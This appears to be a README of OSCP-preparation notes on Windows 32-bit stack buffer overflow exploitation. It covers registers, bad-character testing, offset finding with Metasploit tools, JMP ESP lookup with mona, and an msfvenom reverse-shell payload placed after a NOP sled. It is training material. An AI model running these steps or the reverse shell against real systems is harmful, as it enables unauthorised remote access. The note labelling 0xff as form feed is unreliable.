# Win32-Buffer-Overflow
 Notes and scripts for a basic windows 32-bit buffer overflow exploit development. Aimed for OSCP preparation.

# Introduction

## First some basics!
The x86 architecture does contain 8 general registers that are used to store data and then can address that point to other positions in the memory.

* EBP (base pointer)
* ESP (stack pointer)
* EAX (accumulator)
* EBX (base)
* ECX (counter)
* EDX (data)
* EDI (destination index)
* ESI (source index)

**EIP**: Extended Instruction Pointer. This is a read-only register and does contain the address of the next instruction to be executed (tells the CPU what to do next).
**ESP**: Extended Stack Pointer. Points to the top of the stack (at any time) at the lower memory location.
**EBP**: Extended Base Stack Pointer. Points to higher address (last item) at the bottom of the stack.
* * *


## Bad Characters
* Common bad chars

1. 0x00     NULL (\0)
2. 0x09     Tab (\t)
3. 0x0a     Line Feed (\n)
4. 0x0d     Carriage Return (\r)
5. 0xff     Form Feed (\f)


* Input for testing bad chars

1. "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
2. "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
3. "\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d"
4. "\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
5. "\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b"
6. "\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
7. "\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
8. "\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
9. "\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87"
10. "\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96"
11. "\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5"
12. "\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
13. "\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
14. "\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
15. "\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
16. "\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
17. "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
* * *

**Generate a list of bad characters in bash:**
`for i in {1..255}; do printf "\\\x%02x" $i; done; echo -e "\r"`

**Generate a list of bad characters in python:**
`'\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])`

* * *

# tl;dr

**Steps:**
- [ ] Find offset
- [ ] Ensure control over EIP at found offset (4 B’s)
- [ ] Find bad characters
- [ ] Find return address (JMP ESP)
- [ ] Ensure EIP overwrite (Breakpoint - F2 - at return address )
- [ ] Ensure buffer length for shellcode is good enough
- [ ] Get a shell

# Global Steps

*Note: These steps are a reminder of the global Windows buffer overflow and are not intended to be a manual :)*

**Step 1**: fuzz till crash and note EIP is overwritten by A's (x41).

**Step 2**: use pattern_create.rb to generate unique string and send it to target
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700`

**Step 3**: identify 4 bytes that overwrite EIP (this is in HEX)

**Step 4**: use pattern_offset.rb to calculate the offset of these specific 4 bytes
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438`

**Step 5**: send new buffer string to check if we can control the EIP register, since it should be written over with B's. Add to exploit and notice the result of the ESP and EIP registers:
`buffer = "A" * 2606 + "B" * 4 + "C" * 90`

**Step 6**: check if more space within buffer is available (increase buffer length from 2700 to 3500 bytes and see if this results in a larger buffer space for our shellcode). Fire up “morespace.py” -> right click ESP -> follow in dump. Add to exploit and check for C's:
`buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)`

**Step 7**: check for bad chars (0x00 to 0xff). Paste all these chars within buffer and check where ESP register dump is truncated (p. 161). Right click ESP and follow in dump to see.
`Notice skipped chars!`

**Step 8**: if we can't jump directly to our buffer, we need to find a reliable address in memory that contains an instruction such as JMP ESP. We could jump to it, and in turn end up at the address pointed to, by the ESP register, at the time of the jump. This would be a reliable indirect way to reacht the memory indicated by ESP register. mona.py can help identify modules in memory that we can search for return address (no DEP and ASLR should be present and high memory range that doesn't contain bad chars)
`!mona modules`
*Check if not being affected by any memory protection schemes (Rebase, SafeSEH, ASLR, NXCompat) and note the specific DLL (right column).*

**Step 9**: JMP ESP equivalent = opcode.
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000  FFE4              jmp esp
```
*Note result as: "\xff\xe4"*

**Step 10**: use mona to find the JMP ESP memory address within the DLL found in step 8. Use one which does not contain any bad chars.
`!mona find -s "\xff\xe4" -m <dllname>.dll`

**Step 11**: pause Immunity Debugger and follow the address (black arrow pointing to right: "Expression to follow"). Note if the JMP ESP is found (pane left above).

**Step 12**: set a breakpoint to check if we can reach the JMP ESP.
*left upper pane -> right click -> go to expression
left upper pane -> right click -> breakpoint -> toggle (F2)
play and do the following:
Add to PoC (the memory address is the one we found in step 10, noted Little Endian):*
`buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390`
*Run PoC and check if breakpoint is hit (message at the bottom of Immunity Debugger).*

**Step 13**: generate reverse shell
`msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"`

**Step 14**: add the reverse shell code to the exploit and change to:
`buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode`
*Increase NOP slide if needed*

* * *
